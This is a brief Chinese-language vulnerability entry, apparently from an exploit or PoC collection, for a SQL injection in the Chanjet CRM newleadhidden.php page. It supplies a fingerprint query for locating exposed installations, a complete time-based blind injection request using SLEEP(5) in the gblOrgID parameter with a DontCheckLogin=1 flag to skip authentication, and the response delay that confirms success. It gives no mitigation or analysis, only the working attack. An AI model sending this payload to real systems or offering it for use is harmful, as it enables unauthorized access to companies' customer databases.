# 畅捷通CRMnewleadhidden.php存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="畅捷通-畅捷CRM"`
- **请求**：`GET /lead/newleadhidden.php?gblOrgID=1+AND+(SELECT+5244+FROM+(SELECT(SLEEP(5)))HAjH)--+-&DontCheckLogin=1 HTTP/1.1`
- **响应特征**：200 响应时间>=5s